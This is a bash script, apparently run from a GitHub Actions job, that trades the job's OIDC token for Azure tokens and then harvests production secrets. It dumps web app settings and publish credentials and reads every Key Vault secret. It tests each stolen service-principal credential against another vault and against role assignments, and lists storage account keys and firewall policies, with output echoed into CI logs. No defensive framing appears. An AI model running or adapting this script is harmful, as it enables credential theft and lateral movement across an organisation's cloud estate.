#!/usr/bin/env bash
set -x
T=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
M="https://management.azure.com"
RG=rg-tbl-platform-prod-sea

OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
tok() { curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode client_id=$1 --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode client_assertion=$OIDC --data-urlencode scope=$2 | jq -r .access_token; }
ctok() { curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode client_id=$1 --data-urlencode client_secret=$2 --data-urlencode scope=$3 | jq -r .access_token; }

ARM=$(tok $AZURE_CLIENT_ID "https://management.azure.com/.default")
VT=$(tok $AZURE_CLIENT_ID "https://vault.azure.net/.default")

echo "=== ALL RESOURCES IN RG ==="
curl -sS -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/resourceGroups/$RG/resources?api-version=2021-04-01" | jq -r '.value[] | "\(.type) \(.name)"'

echo "=== webapp appsettings via ARM POST ==="
W="$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod"
curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" "$W/config/appsettings/list?api-version=2023-12-01" | head -c 3000; echo
echo "=== webapp publish profile / deploy creds ==="
curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" "$W/publishxml?api-version=2023-12-01" | head -c 1000; echo

echo "=== OIDC SP direct on kv-tbl-sec ==="
curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | head -c 1000; echo

echo "=== dump kv-tbl-prod values, test each SP on kv-tbl-sec ==="
curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" > /tmp/slist.json
jq -r '.value[].id' /tmp/slist.json
for u in $(jq -r '.value[].id' /tmp/slist.json); do
  NAME=$(basename $u)
  V=$(curl -sS -H "Authorization: Bearer $VT" "$u?api-version=7.4" | jq -r '.value')
  AID=$(echo "$V" | jq -r '.appId // .clientId // empty' 2>/dev/null)
  CS=$(echo "$V" | jq -r '.clientSecret // .secret // .value // empty' 2>/dev/null)
  [ -z "$AID" ] && { echo "-- $NAME not-cred: $(echo "$V" | head -c 120)"; continue; }
  VSEC=$(ctok $AID "$CS" "https://vault.azure.net/.default")
  echo "== $NAME aid=$AID vtok=${#VSEC}"
  if [ "${#VSEC}" -gt 100 ]; then
    echo "   kv-tbl-prod:"; curl -sS -H "Authorization: Bearer $VSEC" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" | head -c 500; echo
    echo "   kv-tbl-sec:"; curl -sS -H "Authorization: Bearer $VSEC" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | head -c 2000; echo
  fi
  ARMS=$(ctok $AID "$CS" "https://management.azure.com/.default")
  [ "${#ARMS}" -gt 100 ] && { echo "   arm-assign:"; curl -sS -H "Authorization: Bearer $ARMS" "$M/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | jq -r '.value[]?.properties | "\(.roleDefinitionId|split("/")[-1]) <- \(.principalId) scope=\(.scope)"' | head -10; }
done

echo "=== storage account keys ==="
for sa in sttblappcfgprodx3euoz sttblarchiveprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
  curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" "$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$sa/listKeys?api-version=2023-01-01" | jq -c '.keys[]? | {keyName,value: .value[0:16]}'
done

echo "=== AFD endpoints + waf policies ==="
curl -sS -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Cdn/profiles/afd-tbl-prod/afdendpoints?api-version=2024-02-01" | jq -r '.value[]? | "\(.name) \(.properties.hostName) \(.properties.enabledState)"'
curl -sS -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/providers/Microsoft.Network/frontDoorWebApplicationFirewallPolicies?api-version=2024-02-01" | jq -r '.value[]?.name'
